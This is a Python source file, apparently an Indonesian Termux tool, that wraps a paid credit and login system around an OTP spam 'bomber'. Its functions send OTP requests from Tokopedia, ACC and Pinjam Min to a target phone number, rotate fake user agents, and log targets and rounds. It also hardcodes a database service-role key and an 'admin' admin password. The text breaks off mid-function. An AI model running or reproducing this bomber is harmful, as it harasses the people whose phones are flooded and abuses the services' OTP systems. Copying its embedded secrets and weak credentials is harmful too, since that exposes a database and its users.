#!/usr/bin/env python3
"""
XYRA Auth - Pure Python Version
Converted from Cython to support all devices
"""
import json
import os
import re
import getpass
import requests
import smtplib
import random
import time
import sys
import base64
import hashlib
import platform
import subprocess
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from tqdm import tqdm
from simple_term_menu import TerminalMenu
from rich.table import Table
from rich.console import Console
from rich.panel import Panel
from tabulate import tabulate
from fake_useragent import UserAgent

CONFIG_FILE = "config.json"
CONFIG_FILE_PLAIN = "config.json"
OTP_FILE = "otp_data.json"
OTP_EXPIRY = 300
DEFAULT_CREDIT = 3

SUPABASE_URL = "https://feesaxvfbgsgbrncbgpd.supabase.co"
SUPABASE_SERVICE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZlZXNheHZmYmdzZ2JybmNiZ3BkIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2NDU0NTEwMywiZXhwIjoyMDgwMTIxMTAzfQ.MtMiauTXMFhpBjWOvnKEj6KJsj2n1po2YyITL29norQ"

def init_supabase_credit(url, service_key):
    global SUPABASE_URL, SUPABASE_SERVICE_KEY
    SUPABASE_URL = url
    SUPABASE_SERVICE_KEY = service_key

SALT = b"TermuxAuth2024SecureSalt"
PASSPHRASE = b"Tx@uth#Pr0t3ct3d$K3y!2024"

ADMIN_USERNAME = "xyraofficial"
ADMIN_PASSWORD = "admin"

def strip_ansi_codes(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', s)

def visible_width(s):
    clean = re.sub(r'\x1b\[[0-9;]*m', '', s)
    width = 0
    for ch in clean:
        if ord(ch) > 0x1F00:
            width += 2
        else:
            width += 1
    return width

def derive_key_internal(passphrase, salt):
    key = hashlib.pbkdf2_hmac('sha256', passphrase, salt, 100000)
    return base64.urlsafe_b64encode(key)

def xor_decrypt(data, key):
    result = bytearray()
    key_bytes = base64.urlsafe_b64decode(key)
    for i in range(len(data)):
        byte = data[i] ^ key_bytes[i % len(key_bytes)]
        result.append(byte)
    return bytes(result)

def decrypt_config(encrypted_data):
    if len(encrypted_data) < 8:
        return None
    
    header = encrypted_data[:8]
    enc_data = encrypted_data[8:]
    
    if header == b"TXAUTH02":
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=SALT,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(PASSPHRASE))
            f = Fernet(key)
            decrypted = f.decrypt(enc_data)
            json_str = decrypted.decode('utf-8')
            return json.loads(json_str)
        except:
            return None
    
    elif header == b"TXAUTH01":
        try:
            key = derive_key_internal(PASSPHRASE, SALT)
            enc_data = base64.urlsafe_b64decode(enc_data)
            decrypted = xor_decrypt(enc_data, key)
            json_str = decrypted.decode('utf-8')
            return json.loads(json_str)
        except:
            return None
    
    return None

R = '\033[0m'
B = '\033[1m'
D = '\033[2m'
RD = '\033[91m'
GR = '\033[92m'
YL = '\033[93m'
BL = '\033[94m'
MG = '\033[95m'
CY = '\033[96m'
WH = '\033[97m'
DRD = '\033[31m'
DGR = '\033[32m'
DYL = '\033[33m'

console = Console()

def play_beep():
    sys.stdout.write('\a')
    sys.stdout.flush()

def play_success_sound():
    for _ in range(1):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.1)

def play_error_sound():
    for _ in range(2):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.15)

def play_startup_sound():
    for _ in range(3):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.08)

def play_send_success_sound():
    sys.stdout.write('\a')
    sys.stdout.flush()

def play_send_fail_sound():
    for _ in range(2):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.1)

def get_greeting():
    hour = datetime.now().hour
    if 5 <= hour < 11:
        return "Selamat Pagi"
    elif 11 <= hour < 15:
        return "Selamat Siang"
    elif 15 <= hour < 18:
        return "Selamat Sore"
    else:
        return "Selamat Malam"

def getprop(name):
    try:
        return subprocess.check_output(["getprop", name]).decode().strip()
    except:
        return "Unknown"

def get_device_info():
    brand = getprop("ro.product.brand")
    model = getprop("ro.product.model")
    android = getprop("ro.build.version.release")
    arch = platform.machine()
    system = platform.system()
    
    if brand == "Unknown":
        return {
            "System": system,
            "Arch": arch,
            "Type": "PC/Server"
        }
    return {
        "Brand": brand,
        "Model": model,
        "Android": android
    }

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "N/A"

def get_day_name():
    days = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
    return days[datetime.now().weekday()]

def get_month_name():
    months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni",
              "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
    return months[datetime.now().month - 1]

def get_date_str():
    now = datetime.now()
    return f"{get_day_name()}, {now.day:02d} {get_month_name()} {now.year}"

def get_time_str():
    now = datetime.now()
    return f"{now.hour:02d}:{now.minute:02d}:{now.second:02d} WIB"

def loading_tqdm(desc, steps=50):
    for i in tqdm(range(steps), desc=f"  {desc}", colour="green", 
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}", ncols=50):
        time.sleep(0.05)
    print()

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_info_table(dev_info, user_ip):
    table = Table(
        title=f"[bold magenta]★[/bold magenta] [bold white]TERMUX AUTH SYSTEM[/bold white] [bold magenta]★[/bold magenta]",
        show_header=False,
        title_style="bold cyan",
        box=None
    )
    
    if "Brand" in dev_info:
        dev_content = (
            f"[bold cyan]Brand[/bold cyan]   : {dev_info['Brand']}\n"
            f"[bold cyan]Model[/bold cyan]   : {dev_info['Model']}\n"
            f"[bold cyan]Android[/bold cyan] : {dev_info['Android']}"
        )
    else:
        dev_content = (
            f"[bold cyan]System[/bold cyan] : {dev_info['System']}\n"
            f"[bold cyan]Arch[/bold cyan]   : {dev_info['Arch']}\n"
            f"[bold cyan]Type[/bold cyan]   : {dev_info['Type']}"
        )
    
    left_panel = Panel(
        dev_content,
        title="[bold cyan]DEVICE INFO[/bold cyan]",
        border_style="cyan"
    )
    
    user_content = (
        f"[bold green]IP[/bold green]      : {user_ip}\n"
        f"[bold green]Tanggal[/bold green] : {get_date_str()}\n"
        f"[bold green]Waktu[/bold green]   : {get_time_str()}"
    )
    
    right_panel = Panel(
        user_content,
        title="[bold green]USER INFO[/bold green]",
        border_style="green"
    )
    
    table.add_row(left_panel, right_panel)
    console.print(table)

def open_url(url):
    try:
        if os.path.exists("/data/data/com.termux"):
            subprocess.run(["termux-open-url", url], check=False)
        else:
            subprocess.run(["xdg-open", url], check=False)
    except:
        info(f"Buka manual: {url}")

def show_interrupt_message():
    print()
    console.print(Panel(
        f"[bold yellow]PROGRAM DIHENTIKAN[/bold yellow]\n"
        f"[dim]Terima kasih telah menggunakan Termux Auth System[/dim]",
        border_style="yellow",
        padding=(1, 2)
    ))
    print()

def show_developer_info():
    dev_links = [
        ("WhatsApp", "https://wa.me/62895325844493"),
        ("YouTube", "https://youtube.com/@Kz.tutorial"),
        ("Email", "mailto:xyraofficialsup@gmail.com"),
        ("GitHub", "https://github.com/XyraOfficial"),
    ]

    try:
        while True:
            clear()
            print()

            # Prepare developer info using tabulate for a clean look
            dev_rows = [
                ("Name", "XyraOfficial"),
                ("Role", "Developer & Creator"),
                ("Focus", "Automation & Security"),
            ]
            dev_table = tabulate(dev_rows, tablefmt="plain")

            console.print(Panel(
                f"{dev_table}",
                title="[bold cyan]XYRA OFFICIAL DEVELOPER[/bold cyan]",
                border_style="cyan",
                padding=(0, 1)
            ))
            print()

            options = [
                "WhatsApp  -  Chat langsung",
                "YouTube   -  Tutorial & Tips",
                "Email     -  Kirim pesan",
                "GitHub    -  Source code",
                "Kembali   -  Menu Utama",
            ]

            dev_menu = TerminalMenu(
                menu_entries=options,
                title=f"\n{B}  Pilih untuk menghubungi:{R}",
                menu_cursor=" > ",
                menu_cursor_style=("fg_cyan", "bold"),
                menu_highlight_style=("fg_green", "bold"),
            )

            sel = dev_menu.show()

            if sel is None or sel == 4:
                break
            elif sel >= 0 and sel < 4:
                name, url = dev_links[sel]
                loading_tqdm(f"Membuka {name}", 20)
                open_url(url)
                success(f"{name} dibuka!")
                print()
                input(f" {D}Tekan Enter...{R}")
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)

def section(title):
    print()
    console.print(f"[bold green]┌─ {title} {'─' * (30 - len(title))}┐[/bold green]")
    print()

def success(msg, with_sound=True):
    console.print(f" [bold green][✓][/bold green] {msg}")
    if with_sound:
        play_success_sound()

def error(msg, with_sound=True):
    console.print(f" [bold red][✗][/bold red] {msg}")
    if with_sound:
        play_error_sound()

def info(msg):
    console.print(f" [bold yellow][!][/bold yellow] {msg}")

def warning(msg):
    console.print(f" [bold orange1][⚠][/bold orange1] {msg}")

def box_info(lines):
    content = "\n".join(lines)
    panel = Panel(content, border_style="dim")
    console.print(panel)

def load_config():
    package_dir = os.path.dirname(os.path.abspath(__file__))
    
    plain_paths = [
        CONFIG_FILE_PLAIN,
        os.path.join(os.getcwd(), CONFIG_FILE_PLAIN),
        os.path.join(package_dir, CONFIG_FILE_PLAIN),
    ]
    
    for plain_path in plain_paths:
        if os.path.exists(plain_path):
            with open(plain_path, 'r') as f:
                return json.load(f)
    
    config_paths = [
        CONFIG_FILE,
        os.path.join(os.getcwd(), CONFIG_FILE),
        os.path.join(package_dir, CONFIG_FILE),
    ]
    
    for config_path in config_paths:
        if os.path.exists(config_path):
            with open(config_path, 'rb') as f:
                enc_data = f.read()
            cfg = decrypt_config(enc_data)
            if cfg is not None:
                return cfg
    
    error("File config tidak ditemukan!")
    return None

def valid_email(e):
    return bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', e))

def valid_pass(p):
    if len(p) >= 6:
        return (True, "")
    return (False, "Min 6 karakter")

def gen_otp():
    return str(random.randint(100000, 999999))

def save_otp(email, otp):
    data = {}
    if os.path.exists(OTP_FILE):
        with open(OTP_FILE, 'r') as f:
            data = json.load(f)
    data[email] = {"otp": otp, "time": time.time()}
    with open(OTP_FILE, 'w') as f:
        json.dump(data, f)

def check_otp(email, code):
    if not os.path.exists(OTP_FILE):
        return (False, "OTP tidak ada")
    with open(OTP_FILE, 'r') as f:
        data = json.load(f)
    if email not in data:
        return (False, "OTP tidak ditemukan")
    if time.time() - data[email]["time"] > OTP_EXPIRY:
        del data[email]
        with open(OTP_FILE, 'w') as f:
            json.dump(data, f)
        return (False, "OTP expired")
    if data[email]["otp"] != code:
        return (False, "Kode salah")
    del data[email]
    with open(OTP_FILE, 'w') as f:
        json.dump(data, f)
    return (True, "Valid")

def _supabase_headers():
    return {
        "apikey": SUPABASE_SERVICE_KEY,
        "Authorization": f"Bearer {SUPABASE_SERVICE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    }

def _get_user_credit_data(user_id):
    headers = _supabase_headers()
    url = f"{SUPABASE_URL}/rest/v1/user_credits?user_id=eq.{user_id}"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data and len(data) > 0:
                return data[0]
        return None
    except:
        return None

def _create_user_credit(user_id, credit, used):
    headers = _supabase_headers()
    url = f"{SUPABASE_URL}/rest/v1/user_credits"
    payload = {"user_id": user_id, "credit": credit, "used": used}
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code in [200, 201]
    except:
        return False

def _update_user_credit(user_id, credit, used):
    headers = _supabase_headers()
    url = f"{SUPABASE_URL}/rest/v1/user_credits?user_id=eq.{user_id}"
    payload = {"credit": credit, "used": used}
    try:
        r = requests.patch(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except:
        return False

def get_user_credit(user_id):
    data = _get_user_credit_data(user_id)
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT, 0)
        return DEFAULT_CREDIT
    return data.get("credit", DEFAULT_CREDIT)

def get_user_used(user_id):
    data = _get_user_credit_data(user_id)
    if data is None:
        return 0
    return data.get("used", 0)

def use_credit(user_id, amount=1):
    data = _get_user_credit_data(user_id)
    
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT, 0)
        data = {"credit": DEFAULT_CREDIT, "used": 0}
    
    current_credit = data.get("credit", DEFAULT_CREDIT)
    current_used = data.get("used", 0)
    
    if current_credit < amount:
        return False
    
    _update_user_credit(user_id, current_credit - amount, current_used + amount)
    return True

def add_credit(user_id, amount):
    data = _get_user_credit_data(user_id)
    
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT + amount, 0)
        return
    
    current_credit = data.get("credit", DEFAULT_CREDIT)
    current_used = data.get("used", 0)
    _update_user_credit(user_id, current_credit + amount, current_used)

def remove_credit(user_id, amount):
    data = _get_user_credit_data(user_id)
    
    if data is None:
        _create_user_credit(user_id, max(0, DEFAULT_CREDIT - amount), 0)
        return
    
    current_credit = data.get("credit", DEFAULT_CREDIT)
    current_used = data.get("used", 0)
    _update_user_credit(user_id, max(0, current_credit - amount), current_used)

def set_credit(user_id, amount):
    data = _get_user_credit_data(user_id)
    
    if data is None:
        _create_user_credit(user_id, max(0, amount), 0)
        return
    
    _update_user_credit(user_id, max(0, amount), data.get("used", 0))

def reset_user_credit(user_id):
    data = _get_user_credit_data(user_id)
    
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT, 0)
        return
    
    _update_user_credit(user_id, DEFAULT_CREDIT, 0)

def get_all_credits():
    headers = _supabase_headers()
    url = f"{SUPABASE_URL}/rest/v1/user_credits"
    result = {}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            for item in data:
                user_id = item.get("user_id", "")
                if user_id:
                    result[user_id] = {"credit": item.get("credit", 0), "used": item.get("used", 0)}
        return result
    except:
        return {}

CREDIT_PRICE = 1000
CREDIT_FEE = 500
DISCOUNT_THRESHOLD = 10
DISCOUNT_PERCENT = 10

OWNER_DANA = "0895325844493"
OWNER_OVO = "0895325844493"
OWNER_SEABANK = "901087597707"
ADMIN_WA = "62895325844493"
ADMIN_EMAIL = "xyraofficialsup@gmail.com"

def calculate_credit_price(credit_amount):
    base_price = credit_amount * CREDIT_PRICE
    discount = 0
    discount_amount = 0
    
    if credit_amount >= DISCOUNT_THRESHOLD:
        discount = DISCOUNT_PERCENT
        discount_amount = (base_price * discount) // 100
    
    subtotal = base_price - discount_amount
    total = subtotal + CREDIT_FEE
    
    return (base_price, discount, discount_amount, CREDIT_FEE, total)

def email_template(otp, to):
    return f'''<!DOCTYPE html><html><body style="margin:0;padding:0;font-family:Arial;background:#0f0f23">
<table style="width:100%"><tr><td align="center" style="padding:40px 0">
<table style="max-width:500px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:20px;overflow:hidden">
<tr><td style="padding:40px;text-align:center">
<div style="font-size:50px;margin-bottom:20px">🔐</div>
<h1 style="color:#fff;margin:0">Kode Verifikasi</h1>
<p style="color:#888;margin:10px 0 30px">Termux Auth System</p>
<div style="background:linear-gradient(135deg,#667eea,#764ba2);border-radius:16px;padding:30px">
<p style="color:rgba(255,255,255,0.8);margin:0 0 10px;font-size:12px">KODE OTP</p>
<h2 style="color:#fff;font-size:48px;margin:0;letter-spacing:10px;font-family:monospace">{otp}</h2>
</div>
<p style="color:#f6ad55;margin:30px 0">⏱️ Berlaku 5 menit</p>
<div style="background:rgba(255,100,100,0.1);border:1px solid rgba(255,100,100,0.3);border-radius:10px;padding:15px">
<p style="color:#fc8181;margin:0;font-size:13px">⚠️ Jangan bagikan kode ini!</p>
</div>
</td></tr>
<tr><td style="padding:20px;background:rgba(0,0,0,0.2);text-align:center">
<p style="color:#666;font-size:12px;margin:0">Dikirim ke: {to}</p>
</td></tr></table></td></tr></table></body></html>'''

def send_email(cfg, to, otp):
    smtp_email = cfg.get("smtp_email", "")
    smtp_pass = cfg.get("smtp_app_password", "")
    if not smtp_email or not smtp_pass:
        return (False, "SMTP tidak dikonfigurasi")
    try:
        msg = MIMEMultipart('alternative')
        msg['Subject'] = f'🔐 Kode OTP: {otp}'
        msg['From'] = f'Termux Auth <{smtp_email}>'
        msg['To'] = to
        msg.attach(MIMEText(f'Kode OTP Anda: {otp}\nBerlaku 5 menit.', 'plain'))
        msg.attach(MIMEText(email_template(otp, to), 'html'))
        srv = smtplib.SMTP('smtp.gmail.com', 587)
        srv.starttls()
        srv.login(smtp_email, smtp_pass)
        srv.sendmail(smtp_email, to, msg.as_string())
        srv.quit()
        return (True, "OTP terkirim!")
    except smtplib.SMTPAuthenticationError:
        return (False, "Login SMTP gagal")
    except Exception as e:
        return (False, str(e))

def valid_phone(phone):
    cleaned = phone.strip()
    if cleaned.startswith("+62"):
        cleaned = cleaned[3:]
    elif cleaned.startswith("62"):
        cleaned = cleaned[2:]
    elif cleaned.startswith("0"):
        cleaned = cleaned[1:]
    
    if not cleaned.startswith("8"):
        return (False, "", "Nomor harus diawali 8 (contoh: 895325844493)")
    
    if not cleaned.isdigit():
        return (False, "", "Nomor harus angka saja")
    
    if len(cleaned) < 9 or len(cleaned) > 13:
        return (False, "", "Panjang nomor tidak valid (9-13 digit)")
    
    return (True, cleaned, "")

used_user_agents = set()

def get_unique_ua():
    max_attempts = 50
    attempt = 0
    global used_user_agents
    
    try:
        ua = UserAgent()
        while attempt < max_attempts:
            new_ua = ua.random
            if new_ua not in used_user_agents:
                used_user_agents.add(new_ua)
                return new_ua
            attempt += 1
        used_user_agents.clear()
        new_ua = ua.random
        used_user_agents.add(new_ua)
        return new_ua
    except:
        return "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36"

def send_tokopedia(phone):
    ua = get_unique_ua()
    url = "https://gql.tokopedia.com/graphql/OTPRequest"
    phone_with_62 = "62" + phone
    
    payload = [{
        "operationName": "OTPRequest",
        "variables": {
            "msisdn": phone_with_62,
            "MsisdnEnc": "",
            "EmailEnc": "",
            "otpType": "116",
            "mode": "whatsapp",
            "otpDigit": 6
        },
        "query": "query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\n  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\n    success\n    message\n    errorMessage\n    prefixMisscall\n    message_title\n    message_sub_title\n    message_img_link\n    error_code\n  }\n}\n"
    }]
    
    headers = {
        'User-Agent': ua,
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'x-version': "1607a8a",
        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'x-source': "tokopedia-lite",
        'x-tkpd-akamai': "otp",
        'x-tkpd-lite-service': "oauth",
        'origin': "https://www.tokopedia.com",
        'x-requested-with': "mark.via.gp",
        'sec-fetch-site': "same-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.tokopedia.com/",
        'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        'priority': "u=1, i"
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            return (True, "Tokopedia")
        return (False, f"Tokopedia: {r.status_code}")
    except Exception as e:
        return (False, f"Tokopedia: {str(e)[:30]}")

def send_acc(phone):
    ua = get_unique_ua()
    url = "https://www.acc.co.id/register/new-account"
    phone_with_0 = "0" + phone
    
    payload = json.dumps([{
        "user_id": None,
        "action": "register",
        "send_to": phone_with_0,
        "provider": "whatsapp"
    }])
    
    headers = {
        'User-Agent': ua,
        'Accept': "text/x-component",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "text/plain",
        'sec-ch-ua-platform': '"Android"',
        'next-action': "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7",
        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        'Origin': "https://www.acc.co.id",
        'X-Requested-With': "mark.via.gp",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://www.acc.co.id/register/new-account",
        'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            return (True, "ACC")
        return (False, f"ACC: {r.status_code}")
    except Exception as e:
        return (False, f"ACC: {str(e)[:30]}")

def send_pinjam_min(phone):
    ua = get_unique_ua()
    url = "https://api.pinjamin.com/ina/util/verify-code"
    
    payload = {
        "sign": "4fceed9522eb49553a223d76f88b436d",
        "phone": phone,
        "type": 1
    }
    
    headers = {
        'User-Agent': ua,
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'X-VERSION': "2.2.4",
        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
        'X-TOKEN': "",
        'sec-ch-ua-mobile': "?1",
        'X-SOURCE': "",
        'X-applicationId': "com.pinjamwinwin",
        'X-CHANNEL': "Pinjamwinwin",
        'Origin': "https://web.pinjamin.com",
        'X-Requested-With': "com.pinjamwinwin",
        'Sec-Fetch-Site': "same-site",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://web.pinjamin.com/",
        'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            return (True, "Pinjam Min")
        return (False, f"Pinjam Min: {r.status_code}")
    except Exception as e:
        return (False, f"Pinjam Min: {str(e)[:30]}")

WA_SERVICES = [
    ("ACC", send_acc),
    ("Pinjam Min", send_pinjam_min),
]

def _get_target_log(user_id, phone):
    headers = _supabase_headers()
    url = f"{SUPABASE_URL}/rest/v1/otp_target_logs?user_id=eq.{user_id}&phone=eq.{phone}"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data and len(data) > 0:
                return data[0]
        return None
    except:
        return None

def save_otp_log(user_id, phone, status, service_name=""):
    headers = _supabase_headers()
    existing = _get_target_log(user_id, phone)
    services = {}
    
    if existing is None:
        if service_name:
            services[service_name] = {"success": 1 if status == "success" else 0, "failed": 1 if status == "failed" else 0}
        
        payload = {
            "user_id": user_id,
            "phone": phone,
            "services": json.dumps(services),
            "total_success": 1 if status == "success" else 0,
            "total_failed": 1 if status == "failed" else 0,
            "total_rounds": 0
        }
        url = f"{SUPABASE_URL}/rest/v1/otp_target_logs"
        try:
            requests.post(url, json=payload, headers=headers, timeout=10)
        except:
            pass
    else:
        services_raw = existing.get("services", {})
        if isinstance(services_raw, str):
            try:
                services = json.loads(services_raw)
            except:
                services = {}
        elif isinstance(services_raw, dict):
            services = services_raw
        else:
            services = {}
        
        if service_name:
            if service_name not in services:
                services[service_name] = {"success": 0, "failed": 0}
            if status == "success":
                services[service_name]["success"] = services[service_name].get("success", 0) + 1
            else:
                services[service_name]["failed"] = services[service_name].get("failed", 0) + 1
        
        total_success = existing.get("total_success", 0) + (1 if status == "success" else 0)
        total_failed = existing.get("total_failed", 0) + (1 if status == "failed" else 0)
        
        payload = {
            "services": json.dumps(services),
            "total_success": total_success,
            "total_failed": total_failed,
            "last_sent_at": datetime.now().isoformat()
        }
        url = f"{SUPABASE_URL}/rest/v1/otp_target_logs?user_id=eq.{user_id}&phone=eq.{phone}"
        try:
            requests.patch(url, json=payload, headers=headers, timeout=10)
        except:
            pass

def update_target_rounds(user_id, phone, rounds):
    headers = _supabase_headers()
    existing = _get_target_log(user_id, phone)
    
    if existing:
        payload = {
            "total_rounds": existing.get("total_rounds", 0) + rounds
        }
        url = f"{SUPABASE_URL}/rest/v1/otp_target_logs?user_id=eq.{user_id}&phone=eq.{phone}"
        try:
            requests.patch(url, json=payload, headers=headers, timeout=10)
        except:
            pass


class Auth:
    def __init__(self, url, key, svc_key=""):
        self.url = url
        self.h = {"apikey": key, "Content-Type": "application/json"}
        self.service_key = svc_key
    
    def signup(self, email, pw):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.post(f"{self.url}/auth/v1/admin/users", 
                json={
                    "email": email, 
                    "password": pw,
                    "email_confirm": False
                }, headers=admin_h)
            d = r.json()
            if r.status_code == 200:
                uid = d.get("id", "")
                return (True, {"uid": uid, "email": email})
            elif r.status_code == 422 or "already been registered" in str(d):
                return (False, {"error": "Email sudah terdaftar"})
            return (False, {"error": d.get("msg", d.get("error_description", "Gagal"))})
        except Exception as e:
            return (False, {"error": str(e)})
    
    def login(self, email, pw):
        try:
            login_h = {"apikey": self.service_key, "Content-Type": "application/json"}
            r = requests.post(f"{self.url}/auth/v1/token?grant_type=password",
                json={"email": email, "password": pw}, headers=login_h)
            d = r.json()
            if r.status_code == 200:
                return (True, {"uid": d.get("user", {}).get("id"), 
                    "email": d.get("user", {}).get("email"),
                    "token": d.get("access_token")})
            err = d.get("error_description", "")
            if "not confirmed" in err.lower():
                return (False, {"error": "UNVERIFIED", "email": email})
            return (False, {"error": err or "Login gagal"})
        except Exception as e:
            return (False, {"error": str(e)})
    
    def list_users(self):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.get(f"{self.url}/auth/v1/admin/users", headers=admin_h)
            if r.status_code == 200:
                data = r.json()
                users = data.get("users", [])
                return (True, users)
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    def delete_user(self, uid):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.delete(f"{self.url}/auth/v1/admin/users/{uid}", headers=admin_h)
            if r.status_code == 200:
                return (True, "User dihapus!")
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    def get_user(self, uid):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.get(f"{self.url}/auth/v1/admin/users/{uid}", headers=admin_h)
            if r.status_code == 200:
                return (True, r.json())
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    def confirm_email(self, uid):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.put(f"{self.url}/auth/v1/admin/users/{uid}", 
                json={"email_confirm": True}, headers=admin_h)
            if r.status_code == 200:
                return (True, "Email terverifikasi!")
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    def get_user_by_email(self, email):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.get(f"{self.url}/auth/v1/admin/users", headers=admin_h)
            if r.status_code == 200:
                data = r.json()
                users = data.get("users", [])
                for u in users:
                    if u.get("email", "").lower() == email.lower():
                        return (True, u)
                return (False, {"error": "User tidak ditemukan"})
            return (False, {"error": f"Error: {r.status_code}"})
        except Exception as e:
            return (False, {"error": str(e)})


def get_email():
    while True:
        e = input(f" {GR}[?]{R} Email    : {CY}").strip()
        print(R, end="")
        if valid_email(e):
            return e
        error("Email tidak valid")

def get_pass(confirm=False):
    while True:
        p = getpass.getpass(f" {GR}[?]{R} Password : {CY}")
        print(R, end="")
        ok, msg = valid_pass(p)
        if not ok:
            error(msg)
            continue
        if confirm:
            p2 = getpass.getpass(f" {GR}[?]{R} Konfirm  : {CY}")
            print(R, end="")
            if p != p2:
                error("Password tidak cocok")
                continue
        return p

def otp_input(email, cfg, tries=3):
    while tries > 0:
        code = input(f" {YL}[?]{R} OTP [{GR}{tries}x{R}] : {CY}").strip()
        print(R, end="")
        ok, msg = check_otp(email, code)
        if ok:
            return True
        tries -= 1
        error(msg)
    return False

def do_signup(auth, cfg):
    section("SIGNUP")
    email = get_email()
    pw = get_pass(True)
    print()
    loading_tqdm("Membuat akun", 25)
    ok, res = auth.signup(email, pw)
    if ok:
        uid = res.get("uid", "") if isinstance(res, dict) else ""
        success("Akun dibuat!")
        loading_tqdm("Mengirim OTP", 30)
        otp = gen_otp()
        save_otp(email, otp)
        sent, msg = send_email(cfg, email, otp)
        if sent:
            success(msg)
            print()
            if otp_input(email, cfg):
                print()
